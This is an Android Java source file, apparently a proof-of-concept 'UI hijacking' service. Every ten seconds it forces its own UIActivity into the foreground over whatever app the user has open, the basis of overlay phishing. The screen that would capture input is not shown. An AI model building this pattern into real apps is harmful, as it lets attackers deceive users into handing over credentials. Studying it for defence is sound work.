package com.jussi.uihijack;

import android.app.Service;
import android.content.Intent;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;

/**
 * 劫持服务
 */

public class HijackingService extends Service {

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private boolean hasStart = false;

    Handler handler = new Handler();
    Runnable mTask = new Runnable() {
        @Override
        public void run() {
            hijackPackage();
            handler.postDelayed(mTask, 10000);
        }
    };

    @Override
    public void onCreate() {
        super.onCreate();
    }

    @Override
    public void onStart(Intent intent, int startId) {
        super.onStart(intent, startId);
        Log.w("hijacking", "劫持服务开启");
        if (!hasStart){
            handler.postDelayed(mTask, 10000);
            Log.w("hijacking", "定时劫持任务开始执行");
            hasStart = true;
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.w("hijacking", "劫持服务停止");
        hasStart = false;
        handler.removeCallbacks(mTask);
        Log.w("hijacking", "定时劫持任务停止");
    }

    private void hijackPackage(){

        Log.w("hijacking", "已经劫持" );

        Intent jackingIsComing = new Intent(getBaseContext(), com.jussi.uihijack.UIActivity.class);
        jackingIsComing.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        getApplication().startActivity(jackingIsComing);

        Log.w("hijacking", "一次劫持结束");

    }
}
